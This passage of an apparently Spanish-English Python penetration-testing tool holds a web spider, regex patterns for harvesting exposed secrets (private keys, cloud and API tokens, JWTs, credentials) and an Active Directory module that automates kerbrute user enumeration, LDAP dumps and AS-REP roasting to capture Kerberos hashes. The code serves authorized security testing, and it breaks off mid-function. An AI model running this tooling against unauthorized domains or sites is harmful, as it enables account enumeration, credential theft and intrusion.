                        if not href or href.startswith('#') or href.startswith('javascript:'):
                            continue
                        absolute = urljoin(current_url, href)
                        parsed_abs = urlparse(absolute)
                        if parsed_abs.netloc != base_domain:
                            continue
                        clean_abs = parsed_abs._replace(fragment='')
                        abs_url = urlunparse(clean_abs)
                        if use_robots and robots_parser and not robots_parser.can_fetch("*", abs_url):
                            continue
                        if abs_url not in discovered_urls:
                            discovered_urls.add(abs_url)
                            urls_queue.append((abs_url, depth+1))
                    
                    for form in soup.find_all('form'):
                        action = form.get('action', '')
                        method = form.get('method', 'get').upper()
                        form_action_url = urljoin(current_url, action) if action else current_url
                        if action:
                            parsed_f = urlparse(form_action_url)
                            if parsed_f.netloc == base_domain:
                                clean_f = parsed_f._replace(fragment='')
                                f_url = urlunparse(clean_f)
                                if f_url not in discovered_urls:
                                    discovered_urls.add(f_url)
                                    urls_queue.append((f_url, depth+1))
                        # Extract useful inputs (excluding submit/button/etc.)
                        form_inputs = []
                        for inp in form.find_all(['input', 'textarea', 'select']):
                            name = inp.get('name')
                            if not name:
                                continue
                            itype = (inp.get('type') or '').lower()
                            if itype in ('submit', 'button', 'image', 'reset', 'file'):
                                continue
                            form_inputs.append(name)
                            all_params.add(name)
                        if not form_inputs:
                            continue
                        # Deduplicate by (action_url, method, tuple of sorted inputs)
                        form_key = (
                            form_action_url,
                            method,
                            tuple(sorted(set(form_inputs)))
                        )
                        if form_key in form_keys_seen:
                            continue
                        form_keys_seen.add(form_key)
                        forms_found.append({
                            'page_url': current_url,
                            'url': form_action_url,
                            'action': form_action_url,
                            'method': method,
                            'inputs': sorted(set(form_inputs)),
                        })
                    
                    for u in list(discovered_urls):
                        parsed_u = urlparse(u)
                        if parsed_u.query:
                            for key in parse_qs(parsed_u.query).keys():
                                all_params.add(key)
                else:
                    hrefs = re.findall(r'href=["\'](.*?)["\']', resp.text)
                    for href in hrefs:
                        if href and not href.startswith('#') and not href.startswith('javascript:'):
                            absolute = urljoin(current_url, href)
                            parsed_abs = urlparse(absolute)
                            if parsed_abs.netloc != base_domain:
                                continue
                            if absolute not in discovered_urls:
                                discovered_urls.add(absolute)
                                urls_queue.append((absolute, depth+1))
            except Exception as e:
                print_error(f"Error spidering {current_url}: {e}")
                continue
    
    print_good(f"Spidering completed. Pages visited: {len(visited)}, unique URLs discovered: {len(discovered_urls)}")
    if all_params:
        print_info(f"Unique parameters found: {len(all_params)} -> {', '.join(list(all_params)[:20])}")
    if forms_found:
        print_info(f"Forms detected during spidering: {len(forms_found)}")
    return discovered_urls, all_params, forms_found

# ========== SOURCE CODE ANALYSIS ==========
# Search patterns in source code (HTML, JS, JSON, maps, CSS).
# Each entry: (severity, label, compiled regex, requires_value_group).
_SRC_MAX_BYTES = 2 * 1024 * 1024   # cap per file (2 MB)
_SRC_SNIPPET_CHARS = 140
_SRC_MAX_FINDINGS_PER_FILE = 30

_OSURCE_PATTERNS = [
    ("critical", "PEM Private Key",
     re.compile(r"-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY-----"), False),
    ("critical", "Database connection string with credentials",
     re.compile(r"\b(?:mongodb(?:\+srv)?|mysql|postgres(?:ql)?|redis|amqps?|mssql|jdbc:[a-z]+)://[^\s\"'<>]*:[^\s\"'<>@]+@[^\s\"'<>]+", re.IGNORECASE), False),
    ("high", "AWS Access Key ID",
     re.compile(r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b"), False),
    ("high", "AWS Secret Access Key",
     re.compile(r"(?i)aws[_\-]?(?:secret|sk)[_\-]?(?:access[_\-]?)?key[\"'\s:=]{1,8}[\"']?([A-Za-z0-9/+=]{40})"), True),
    ("high", "Google API Key",
     re.compile(r"\bAIza[0-9A-Za-z\-_]{35}\b"), False),
    ("high", "GitHub token",
     re.compile(r"\bgh[pousr]_[A-Za-z0-9]{30,}\b"), False),
    ("high", "Slack token",
     re.compile(r"\bxox[abpros]-[A-Za-z0-9\-]{10,}\b"), False),
    ("high", "Stripe live secret key",
     re.compile(r"\bsk_live_[0-9a-zA-Z]{20,}\b"), False),
    ("high", "JWT token",
     re.compile(r"\beyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{4,}\b"), False),
    ("high", "Credencial hardcoded",
     re.compile(r"(?i)(?:password|passwd|pwd|secret|api[_\-]?key|access[_\-]?key|client[_\-]?secret|auth[_\-]?token|bearer)[\"'\s:=]{1,8}[\"']([^\"'\s]{4,80})[\"']"), True),
    ("medium", "Basic Auth en URL",
     re.compile(r"\bhttps?://[A-Za-z0-9._\-]+:[^\s\"'<>@/]+@[A-Za-z0-9._\-]+"), False),
    ("medium", "Comentario HTML sensible",
     re.compile(
         r"<!--\s*("
         # Comment content that does NOT cross '-->'
         r"(?:(?!-->)[\s\S]){0,400}"
         # Genuinely sensitive keyword
         r"(?:password|passwd|pwd|secret|api[_\-]?key|access[_\-]?key|"
         r"private[_\-]?key|client[_\-]?secret|auth[_\-]?token|bearer|"
         r"credentials|hardcoded|backdoor|deprecated|do not commit|"
         r"todo[: ]|fixme[: ]|xxx[: ]|hack[: ]|"
         r"backup\s+(?:file|path|server|db)|"
         r"internal\s+(?:use|api|server|tool)|"
         r"debug\s+(?:enabled|mode|key|token))"
         r"(?:(?!-->)[\s\S]){0,400}"
         r")\s*-->",
         re.IGNORECASE), True),
    ("medium", "Exposed source map",
     re.compile(r"//[#@]\s*sourceMappingURL\s*=\s*([^\s\"']+)"), True),
    ("medium", "Hardcoded private IP",
     re.compile(r"\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3})\b"), False),
    ("low", "Path sensible referenciada",
     re.compile(r"[\"'](/(?:admin|adminer|debug|console|h2-console|phpmyadmin|backup|backups|dump|wp-admin|actuator|internal|staging|.git|.env)[A-Za-z0-9_\-/.]*)[\"']"), True),
    ("low", "Email exposed",
     re.compile(r"\b[A-Za-z0-9_.+\-]+@[A-Za-z0-9\-]+\.[A-Za-z0-9.\-]+\b"), False),
]

_OSURCE_ASSET_EXT = ('.js', '.mjs', '.jsx', '.ts', '.tsx', '.json', '.map', '.css', '.txt', '.xml', '.yml', '.yaml', '.env')
_OSURCE_TEXT_CT = ('text/', 'application/javascript', 'application/json', 'application/xml',
                   'application/x-yaml', 'application/yaml', 'application/octet-stream')


def _is_source_text_response(content_type, url):
    ct = (content_type or '').lower()
    if any(t in ct for t in _OSURCE_TEXT_CT):
        return True
    path = urlparse(url).path.lower()
    return path.endswith(_OSURCE_ASSET_EXT)


def _download_text_capped(session, url, max_bytes=_SRC_MAX_BYTES):
    """Downloads the body as text with a byte cap (avoids huge downloads)."""
    try:
        resp = session.get(url, timeout=DEFAULT_TIMEOUT, stream=True, allow_redirects=True)
    except requests.RequestException as e:
        return None, None, str(e)
    try:
        if resp.status_code != 200:
            return None, resp.headers.get('Content-Type', ''), f"status {resp.status_code}"
        clen = resp.headers.get('Content-Length')
        if clen and clen.isdigit() and int(clen) > max_bytes:
            return None, resp.headers.get('Content-Type', ''), f"too large ({clen} bytes)"
        buf = bytearray()
        for chunk in resp.iter_content(chunk_size=16384):
            if not chunk:
                continue
            buf.extend(chunk)
            if len(buf) >= max_bytes:
                break
        encoding = resp.encoding or 'utf-8'
        try:
            text = buf.decode(encoding, errors='replace')
        except (LookupError, TypeError):
            text = buf.decode('utf-8', errors='replace')
        return text, resp.headers.get('Content-Type', ''), None
    finally:
        try:
            resp.close()
        except Exception:
            pass


def _extract_linked_assets(html_text, base_url, base_netloc):
    """Return script/link/source/.map URLs from the same domain referenced in the HTML."""
    assets = set()
    if not html_text:
        return assets
    if HAS_BS4:
        try:
            soup = BeautifulSoup(html_text, 'html.parser')
            for tag in soup.find_all(['script', 'link', 'iframe', 'source', 'img', 'a']):
                src = tag.get('src') or tag.get('href')
                if not src:
                    continue
                absu = urljoin(base_url, src.strip())
                parsed = urlparse(absu)
                if parsed.scheme not in ('http', 'https'):
                    continue
                if parsed.netloc != base_netloc:
                    continue
                path = parsed.path.lower()
                if path.endswith(_OSURCE_ASSET_EXT):
                    assets.add(urlunparse(parsed._replace(fragment='')))
        except Exception:
            pass
    else:
        for m in re.finditer(r'(?:src|href)\s*=\s*["\']([^"\']+)["\']', html_text, re.IGNORECASE):
            absu = urljoin(base_url, m.group(1).strip())
            parsed = urlparse(absu)
            if parsed.netloc == base_netloc and parsed.path.lower().endswith(_OSURCE_ASSET_EXT):
                assets.add(urlunparse(parsed._replace(fragment='')))
    return assets


def _scan_text_for_secrets(text, source_url):
    """Apply catalog patterns to text and return a list of findings."""
    findings = []
    seen = set()
    if not text:
        return findings
    for severity, label, regex, has_group in _OSURCE_PATTERNS:
        try:
            matches = list(regex.finditer(text))
        except re.error:
            continue
        for m in matches:
            value = m.group(1) if (has_group and m.lastindex) else m.group(0)
            value = (value or "").strip()
            if not value:
                continue
            if label == "Email exposed" and value.lower().endswith(('.png', '.jpg', '.svg', '.gif', '.webp')):
                continue
            # UI boilerplate filter for HTML comments: if the comment
            # is clearly decorative (footer/header/logo/...) without content
            # realmente sensible alrededor, descartarlo.
            if label == "Comentario HTML sensible":
                low = value.lower()
                ui_only = ("footer", "header", "navbar", "nav bar", "sidebar",
                           "logo", "icon", "button", "banner", "carousel",
                           "modal", "tooltip", "dropdown", "breadcrumb",
                           "container", "wrapper", "section start", "section end",
                           "begin block", "end block", "content start", "content end")
                # If the comment contains a UI keyword and does NOT contain
                # ninguna palabra realmente sensible (password/secret/token/...),
                # ignorarlo.
                strong = ("password", "passwd", "secret", "api_key", "api-key",
                          "apikey", "private_key", "private-key", "access_key",
                          "access-key", "auth_token", "auth-token", "bearer ",
                          "credentials", "hardcoded", "backdoor", "do not commit")
                if any(u in low for u in ui_only) and not any(s in low for s in strong):
                    continue
            key = (label, value[:80].lower())
            if key in seen:
                continue
            seen.add(key)
            start = max(0, m.start() - 30)
            end = min(len(text), m.end() + 30)
            snippet = text[start:end].replace('\n', ' ').replace('\r', ' ')
            if len(snippet) > _SRC_SNIPPET_CHARS:
                snippet = snippet[:_SRC_SNIPPET_CHARS - 3] + '...'
            findings.append({
                "severity": severity,
                "type": label,
                "url": source_url,
                "value": value[:160],
                "snippet": snippet,
            })
            if len(findings) >= _SRC_MAX_FINDINGS_PER_FILE:
                return findings
    return findings


def analyze_source_code(target, session, urls=None, max_urls=120, max_assets=200):
    """Analyze discovered URL source code for credentials and exposed data.

    Args:
        target: Base URL (used to infer the domain).
        session: requests.Session activa (autenticada si procede).
        urls: iterable of URLs (spider sample). If None, only the target is used.
        max_urls: maximum number of HTML pages to download.
        max_assets: maximum number of JS/JSON/MAP assets to download.

    Return a dict with statistics and a list of findings.
    """
    base_netloc = urlparse(target).netloc
    seed_urls = list(urls) if urls else [target]
    if target not in seed_urls:
        seed_urls.insert(0, target)
    # Limit pages: prioritize HTML URLs
    seed_urls = [u for u in seed_urls if urlparse(u).netloc == base_netloc][:max_urls]

    print_info(f"Analyzing source code for {len(seed_urls)} pages (max {max_urls})...")

    findings = []
    pages_analyzed = 0
    assets_to_scan = set()
    pages_iter = tqdm(seed_urls, desc="Pages", unit="pg", ncols=80,
                      disable=not HAS_TQDM) if HAS_TQDM else seed_urls

    for url in pages_iter:
        text, content_type, err = _download_text_capped(session, url)
        if text is None:
            continue
        pages_analyzed += 1
        if 'html' in (content_type or '').lower() or '<html' in text[:2000].lower():
            assets_to_scan.update(_extract_linked_assets(text, url, base_netloc))
        findings.extend(_scan_text_for_secrets(text, url))

    # Limitar assets analizados
    assets_list = list(assets_to_scan)[:max_assets]
    if assets_list:
        print_info(f"Analizando {len(assets_list)} assets JS/JSON/MAP enlazados...")
    assets_iter = tqdm(assets_list, desc="Assets", unit="file", ncols=80,
                       disable=not HAS_TQDM) if HAS_TQDM else assets_list
    assets_analyzed = 0
    for asset_url in assets_iter:
        text, content_type, err = _download_text_capped(session, asset_url)
        if text is None:
            continue
        if not _is_source_text_response(content_type, asset_url):
            continue
        assets_analyzed += 1
        findings.extend(_scan_text_for_secrets(text, asset_url))

    # Deduplicar globalmente
    seen = set()
    unique_findings = []
    for f in findings:
        key = (f["type"], (f.get("value") or "")[:80].lower(), f.get("url"))
        if key in seen:
            continue
        seen.add(key)
        unique_findings.append(f)

    # Severity summary
    sev_count = {"critical": 0, "high": 0, "medium": 0, "low": 0}
    for f in unique_findings:
        sev_count[f["severity"]] = sev_count.get(f["severity"], 0) + 1

    # Add critical/high findings to global FINDINGS
    for f in unique_findings:
        if f["severity"] in ("critical", "high"):
            FINDINGS.append(
                f"[CODE:{f['severity'].upper()}] {f['type']} en {f['url']} "
                f"— valor: {f['value']}"
            )

    if unique_findings:
        print_good(
            f"Source-code analysis completed: {len(unique_findings)} findings "
            f"(C:{sev_count.get('critical',0)} H:{sev_count.get('high',0)} "
            f"M:{sev_count.get('medium',0)} L:{sev_count.get('low',0)}) "
            f"across {pages_analyzed} pages + {assets_analyzed} assets."
        )
        # Visual table with the first 50 findings sorted by severity
        SEV_ORDER = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3}
        SEV_COLOR = {
            'critical': Fore.MAGENTA, 'high': Fore.RED,
            'medium': Fore.YELLOW,   'low': Fore.CYAN,
        }
        sorted_findings = sorted(
            unique_findings,
            key=lambda x: (SEV_ORDER.get(x.get('severity', 'low'), 99),
                           x.get('type', ''), x.get('url', ''))
        )
        shown = sorted_findings[:50]
        rows = []
        for f in shown:
            sev = f.get('severity', 'low')
            color = SEV_COLOR.get(sev, Fore.WHITE)
            tipo = (f.get('type') or '-')[:30]
            url = f.get('url') or '-'
            if len(url) > 60:
                url = url[:57] + '...'
            value = (f.get('value') or '-').replace('\n', ' ').replace('\r', ' ')
            if len(value) > 50:
                value = value[:47] + '...'
            rows.append([
                f"{color}{sev.upper()}{Style.RESET_ALL}",
                tipo, url, value,
            ])
        if len(unique_findings) <= 50:
            title = f"Source-code analysis findings ({len(unique_findings)}):"
        else:
            title = f"Source-code analysis findings (top 50 of {len(unique_findings)}):"
        print_table(
            headers=["SEVERIDAD", "TIPO", "URL", "VALOR"],
            rows=rows,
            alignments=['<', '<', '<', '<'],
            title=title,
        )
    else:
        print_info(
            f"Source-code analysis completed without findings "
            f"({pages_analyzed} pages, {assets_analyzed} assets)."
        )

    return {
        "pages_analyzed": pages_analyzed,
        "assets_analyzed": assets_analyzed,
        "total_findings": len(unique_findings),
        "summary": sev_count,
        "findings": unique_findings,
    }

# ========== ACTIVE DIRECTORY ==========
def check_kerbrute():
    return shutil.which("kerbrute")

def check_ldapsearch():
    return shutil.which("ldapsearch")

def check_nxc():
    return shutil.which("nxc") or shutil.which("netexec")

def check_impacket_getnpusers():
    return shutil.which("impacket-GetNPUsers")

def check_impacket_getuserspns():
    return shutil.which("impacket-GetUserSPNs")

def _domain_to_base_dn(domain):
    parts = [p.strip() for p in (domain or "").split(".") if p.strip()]
    return ",".join(f"DC={p}" for p in parts)

def _default_ad_user_wordlist():
    for path in (SECLISTS_USERS_SHORT, SECLISTS_USERS):
        if os.path.isfile(path):
            return path
    return None

def _default_ad_password_wordlist():
    for path in (SECLISTS_PASSWORDS, ROCKYOU_WORDLIST):
        if os.path.isfile(path):
            return path
    return None

def _strip_ansi(text):
    return re.sub(r'\x1b\[[0-9;]*[A-Za-z]', '', text or "")

def _format_ad_command(cmd, secrets=None):
    secrets = [s for s in (secrets or []) if s]
    visible = []
    hide_next = False
    for part in cmd:
        if hide_next:
            visible.append("***")
            hide_next = False
            continue
        if part in ("-p", "--password", "-w"):
            visible.append(part)
            hide_next = True
            continue
        value = str(part)
        for secret in secrets:
            value = value.replace(secret, "***")
        visible.append(value)
    return " ".join(f'"{p}"' if " " in str(p) else str(p) for p in visible)

def _run_ad_command(cmd, label, timeout=300, secrets=None):
    visible = _format_ad_command(cmd, secrets=secrets)
    print_info(f"Running {label}: {visible}")
    started = time.time()
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        output = _strip_ansi((proc.stdout or "") + (proc.stderr or ""))
        if output.strip():
            preview = output if len(output) <= 6000 else output[:6000] + "\n...[output truncated in console, complete in report]..."
            print(preview)
        return {
            "label": label,
            "command": visible,
            "returncode": proc.returncode,
            "duration_seconds": round(time.time() - started, 2),
            "output": output,
        }
    except subprocess.TimeoutExpired as e:
        output = _strip_ansi((e.stdout or "") + (e.stderr or ""))
        print_error(f"{label} excedio el timeout de {timeout}s.")
        return {
            "label": label,
            "command": visible,
            "returncode": None,
            "duration_seconds": round(time.time() - started, 2),
            "error": "timeout",
            "output": output,
        }
    except KeyboardInterrupt:
        print_warning(f"{label} interrupted by the user.")
        return {
            "label": label,
            "command": visible,
            "returncode": None,
            "duration_seconds": round(time.time() - started, 2),
            "error": "interrupted",
            "output": "",
        }
    except Exception as e:
        print_error(f"Error running {label}: {e}")
        return {
            "label": label,
            "command": visible,
            "returncode": None,
            "duration_seconds": round(time.time() - started, 2),
            "error": str(e),
            "output": "",
        }

def _parse_kerbrute_users(output, domain=""):
    users = set()
    for line in _strip_ansi(output).splitlines():
        m = re.search(r'VALID\s+(?:USERNAME|LOGIN)\s*:?\s+([^\s]+)', line, re.IGNORECASE)
        if not m and "[+]" in line and "@" in line:
            m = re.search(r'([A-Za-z0-9_.+\-]+@[\w.\-]+)', line)
        if not m:
            continue
        user = m.group(1).strip()
        if domain and user.lower().endswith("@" + domain.lower()):
            user = user[:-(len(domain) + 1)]
        users.add(user)
    return sorted(users)

def _parse_ldif_entries(output):
    entries = []
    current = {}
    last_key = None
    for raw in _strip_ansi(output).splitlines():
        if not raw or raw.startswith("#"):
            if current:
                entries.append(current)
                current = {}
                last_key = None
            continue
        if raw.startswith(" ") and last_key:
            current[last_key][-1] += raw[1:]
            continue
        if ":" not in raw:
            continue
        key, value = raw.split(":", 1)
        key = key.strip()
        value = value.strip()
        if key.endswith(":"):
            key = key[:-1].strip()
        current.setdefault(key, []).append(value)
        last_key = key
    if current:
        entries.append(current)
    return entries

def _first_attr(entry, *names):
    for name in names:
        values = entry.get(name) or []
        if values:
            return values[0]
    return ""

def _normalize_ldap_users(entries):
    users = []
    seen = set()
    for entry in entries:
        username = _first_attr(entry, "sAMAccountName", "uid", "userPrincipalName")
        if not username or username.endswith("$") or username in seen:
            continue
        seen.add(username)
        users.append({
            "username": username,
            "upn": _first_attr(entry, "userPrincipalName"),
            "cn": _first_attr(entry, "cn", "displayName"),
            "memberOf": entry.get("memberOf", []),
            "userAccountControl": _first_attr(entry, "userAccountControl"),
            "pwdLastSet": _first_attr(entry, "pwdLastSet"),
            "lastLogonTimestamp": _first_attr(entry, "lastLogonTimestamp"),
        })
    return users

def _normalize_ldap_groups(entries):
    groups = []
    seen = set()
    for entry in entries:
        name = _first_attr(entry, "cn", "sAMAccountName")
        if not name or name in seen:
            continue
        seen.add(name)
        groups.append({
            "name": name,
            "description": _first_attr(entry, "description"),
            "members": entry.get("member", []),
        })
    return groups

def _normalize_ldap_computers(entries):
    computers = []
    seen = set()
    for entry in entries:
        name = _first_attr(entry, "dNSHostName", "sAMAccountName", "cn")
        if not name or name in seen:
            continue
        seen.add(name)
        computers.append({
            "name": name,
            "os": _first_attr(entry, "operatingSystem"),
            "os_version": _first_attr(entry, "operatingSystemVersion"),
            "lastLogonTimestamp": _first_attr(entry, "lastLogonTimestamp"),
        })
    return computers

def _parse_nxc_credentials(output):
    creds = []
    seen = set()
    for line in _strip_ansi(output).splitlines():
        if "[+]" not in line:
            continue
        m = re.search(r'\[\+\]\s+((?:[^\\\s]+\\)?[^:\s]+):([^\s]+)', line)
        if not m:
            continue
        user = m.group(1)
        pwd = m.group(2)
        key = (user, pwd)
        if key in seen:
            continue
        seen.add(key)
        creds.append({"username": user, "password": pwd, "source": "nxc"})
    return creds

def _ad_artifact_dir(domain, dc):
    safe = re.sub(r'[^A-Za-z0-9_.-]+', '_', f"{domain}_{dc}").strip("_") or "active_directory"
    out_dir = os.path.join(os.getcwd(), "reports", "active_directory", safe)
    os.makedirs(out_dir, exist_ok=True)
    return out_dir

def _write_ad_user_file(users, domain, dc, filename="valid-users.txt"):
    clean = []
    seen = set()
    for user in users or []:
        value = str(user or "").strip()
        if not value:
            continue
        if "@" in value and domain and value.lower().endswith("@" + domain.lower()):
            value = value[:-(len(domain) + 1)]
        if "\\" in value:
            value = value.split("\\", 1)[1]
        if value in seen:
            continue
        seen.add(value)
        clean.append(value)
    if not clean:
        return None
    path = os.path.join(_ad_artifact_dir(domain, dc), filename)
    with open(path, "w", encoding="utf-8") as f:
        for user in clean:
            f.write(user + "\n")
    return path

def _read_hash_lines(path=None, output=""):
    lines = []
    if path and os.path.isfile(path):
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                lines.extend([line.strip() for line in f if line.strip()])
        except Exception:
            pass
    for line in (output or "").splitlines():
        line = line.strip()
        if line.startswith("$krb5"):
            lines.append(line)
    seen = set()
    unique = []
    for line in lines:
        if line in seen:
            continue
        seen.add(line)
        unique.append(line)
    return unique

def _parse_kerberos_hash_user(hash_line):
    if hash_line.startswith("$krb5asrep$"):
        m = re.search(r'\$krb5asrep\$\d+\$([^:@$]+)', hash_line, re.IGNORECASE)
        return m.group(1) if m else ""
    if hash_line.startswith("$krb5tgs$"):
        m = re.search(r'\$krb5tgs\$\d+\$\*?([^$*]+)', hash_line, re.IGNORECASE)
        return m.group(1) if m else ""
    return ""

def _normalize_kerberos_hashes(hash_lines, roast_type):
    hashes = []
    for line in hash_lines:
        hashes.append({
            "type": roast_type,
            "username": _parse_kerberos_hash_user(line),
            "hash": line,
        })
    return hashes

def run_active_directory_pentest(target=None):
    print_phase("PENTESTING ACTIVE DIRECTORY")
    print_warning("Run this module only with explicit authorization for the target domain/AD.")
    parsed = urlparse(target or TARGET_URL or "")
    default_dc = parsed.hostname or ""
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Domain Controller IP/FQDN [{default_dc}]:")
    dc = input("> ").strip() or default_dc
    if not dc:
        print_error("Domain Controller required.")
        return None
    suggested_domain = ".".join((dc.split(".")[1:] if "." in dc else []))
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Domain AD FQDN [{suggested_domain}]:")
    domain = input("> ").strip() or suggested_domain
    if not domain:
        print_error("Domain required for Kerberos/LDAP/NXC.")
        return None
    base_dn = _domain_to_base_dn(domain)
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Base DN LDAP [{base_dn}]:")
    base_dn = input("> ").strip() or base_dn

    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Domain user for enumeration (empty = anonymous/guest):")
    username = input("> ").strip()
    password = ""
    if username:
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Password for {username}:")
        password = getpass.getpass("> ")
    auth_mode = "authenticated" if username else "anonymous"

    result = {
        "target": dc,
        "domain": domain,
        "base_dn": base_dn,
        "auth_mode": auth_mode,
        "username": username,
        "tools": {
            "kerbrute": bool(check_kerbrute()),
            "ldapsearch": bool(check_ldapsearch()),
            "nxc": bool(check_nxc()),
            "impacket-GetNPUsers": bool(check_impacket_getnpusers()),
            "impacket-GetUserSPNs": bool(check_impacket_getuserspns()),
        },
        "kerbrute": {},
        "impacket": {
            "asrep_roast": {"attempted": False, "hashes": []},
            "kerberoast": {"attempted": False, "hashes": []},
        },
        "artifacts": {},
        "ldap": {"users": [], "groups": [], "computers": [], "commands": []},
        "nxc": {"enum": {}, "bruteforce": {"attempted": False, "credentials": []}},
        "raw_commands": [],
    }

    def _adtrim(value, width=80):
        text = str(value if value is not None else "-")
        return text if len(text) <= width else text[: width - 1] + "…"

    if not any(result["tools"].values()):
        print_warning("No se encontraron kerbrute, ldapsearch ni nxc/netexec en PATH.")
        print_warning("En Kali puedes instalar/actualizar herramientas AD desde apt o repos oficiales.")

    ad_user_wordlist = None
    kerbrute_path = check_kerbrute()
    if kerbrute_path:
        default_users = _default_ad_user_wordlist()
        prompt_default = default_users or "no default"
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} User wordlist for kerbrute userenum [{prompt_default}] (empty = skip):")
        user_wl = input_path("> ").strip() or default_users
        ad_user_wordlist = user_wl if user_wl and os.path.isfile(user_wl) else None
        if ad_user_wordlist:
            cmd = [kerbrute_path, "userenum", "--dc", dc, "-d", domain, ad_user_wordlist]
            run = _run_ad_command(cmd, "kerbrute userenum", timeout=900)
            valid_users = _parse_kerbrute_users(run.get("output", ""), domain=domain)
            result["kerbrute"] = {
                "command": run.get("command"),
                "returncode": run.get("returncode"),
                "valid_users": valid_users,
                "output": run.get("output", ""),
            }
            result["raw_commands"].append(run)
            for user in valid_users:
                _append_finding_once(f"[AD:USER] {user}")
            if valid_users:
                print_table(
                    headers=["#", "Valid user (Kerbrute)"],
                    rows=[[str(i), _adtrim(u, 60)] for i, u in enumerate(valid_users, 1)],
                    alignments=['>', '<'],
                    title=f"Kerbrute - valid users ({len(valid_users)}):",
                    border_color=Fore.GREEN,
                )
        elif user_wl:
            print_warning(f"Could not read wordlist de users: {user_wl}")
    else:
        print_warning("kerbrute is not installed or is not in PATH. Skipping Kerberos user enumeration.")

    ldap_path = check_ldapsearch()
    if ldap_path:
        ldap_base = [ldap_path, "-x", "-LLL", "-H", f"ldap://{dc}"]
        if username:
            bind_user = username if "@" in username or "\\" in username else f"{username}@{domain}"
            ldap_base += ["-D", bind_user, "-w", password]
        ldap_queries = [
            ("users", "(&(objectCategory=person)(objectClass=user))",
             ["sAMAccountName", "userPrincipalName", "cn", "displayName", "memberOf", "userAccountControl", "pwdLastSet", "lastLogonTimestamp"]),
            ("groups", "(objectClass=group)", ["cn", "description", "member"]),
            ("computers", "(objectClass=computer)", ["dNSHostName", "sAMAccountName", "operatingSystem", "operatingSystemVersion", "lastLogonTimestamp"]),
        ]
        for label, ldap_filter, attrs in ldap_queries:
            cmd = ldap_base + ["-b", base_dn, ldap_filter] + attrs
            run = _run_ad_command(cmd, f"ldapsearch {label}", timeout=420, secrets=[password])
            entries = _parse_ldif_entries(run.get("output", ""))
            if label == "users":
                result["ldap"]["users"] = _normalize_ldap_users(entries)
                for user in result["ldap"]["users"]:
                    _append_finding_once(f"[AD:LDAP:USER] {user.get('username')}")
                ldap_users_now = result["ldap"]["users"]
                if ldap_users_now:
                    print_table(
                        headers=["User", "Name", "UPN"],
                        rows=[[_adtrim(u.get("username") or "-", 30),
                               _adtrim(u.get("cn") or "-", 35),
                               _adtrim(u.get("upn") or "-", 45)] for u in ldap_users_now[:30]],
                        alignments=['<', '<', '<'],
                        title=f"LDAP — users ({len(ldap_users_now)}):",
                    )
            elif label == "groups":
                result["ldap"]["groups"] = _normalize_ldap_groups(entries)
                ldap_groups_now = result["ldap"]["groups"]
                if ldap_groups_now:
                    print_table(
                        headers=["Group", "Description", "Members"],
                        rows=[[_adtrim(g.get("name") or "-", 35),
                               _adtrim(g.get("description") or "-", 45),
                               str(len(g.get("members") or []))] for g in ldap_groups_now[:30]],
                        alignments=['<', '<', '>'],
                        title=f"LDAP — grupos ({len(ldap_groups_now)}):",
                    )
            elif label == "computers":
                result["ldap"]["computers"] = _normalize_ldap_computers(entries)
                ldap_computers_now = result["ldap"]["computers"]
                if ldap_computers_now:
                    print_table(
                        headers=["Computer", "Yesstema operativo", "Version"],
                        rows=[[_adtrim(c.get("name") or "-", 40),
                               _adtrim(c.get("os") or "-", 35),
                               _adtrim(c.get("os_version") or "-", 18)] for c in ldap_computers_now[:30]],
                        alignments=['<', '<', '<'],
                        title=f"LDAP — computers ({len(ldap_computers_now)}):",
                    )
            command_data = {
                "label": run.get("label"),
                "command": run.get("command"),
                "returncode": run.get("returncode"),
                "output": run.get("output", ""),
            }
            result["ldap"]["commands"].append(command_data)
            result["raw_commands"].append(run)
    else:
        print_warning("ldapsearch is not installed or is not in PATH. Skipping LDAP.")

    discovered_users = []
    discovered_users.extend(result.get("kerbrute", {}).get("valid_users") or [])
    discovered_users.extend([u.get("username") for u in result.get("ldap", {}).get("users", []) if isinstance(u, dict)])
    valid_users_file = _write_ad_user_file(discovered_users, domain, dc)
    if valid_users_file:
        result["artifacts"]["valid_users_file"] = valid_users_file
        print_good(f"Valid users saved for roasting: {valid_users_file}")

    getnp_path = check_impacket_getnpusers()
    if getnp_path:
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Run AS-REP Roasting with impacket-GetNPUsers? [Y/n]:")
        do_asrep = input("> ").strip().lower() != 'n'
        if do_asrep:
            usersfile = valid_users_file
            if not usersfile:
                default_usersfile = ad_user_wordlist or _default_ad_user_wordlist() or ""
                print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Users file path for AS-REP [{default_usersfile or 'required'}]:")
                usersfile = input_path("> ").strip() or default_usersfile
            if not usersfile or not os.path.isfile(usersfile):
                print_warning("AS-REP Roasting requires un usersfile legible.")
            else:
                out_file = os.path.join(_ad_artifact_dir(domain, dc), "asrep_hashes.txt")
                cmd = [
                    getnp_path,
                    f"{domain}/",
                    "-usersfile", usersfile,
                    "-dc-ip", dc,
                    "-format", "hashcat",
                    "-outputfile", out_file,
                ]
                run = _run_ad_command(cmd, "impacket-GetNPUsers AS-REP", timeout=900)
                hashes = _normalize_kerberos_hashes(
                    _read_hash_lines(out_file, run.get("output", "")),
                    "asrep",
                )
                result["impacket"]["asrep_roast"] = {
                    "attempted": True,
                    "command": run.get("command"),
                    "returncode": run.get("returncode"),
                    "output_file": out_file,
                    "hashes": hashes,
                    "output": run.get("output", ""),
                }
                result["raw_commands"].append(run)
                if hashes:
                    print_good(f"AS-REP Roasting: {len(hashes)} hash(es) capturado(s).")
                    print_table(
                        headers=["User", "Hash AS-REP"],
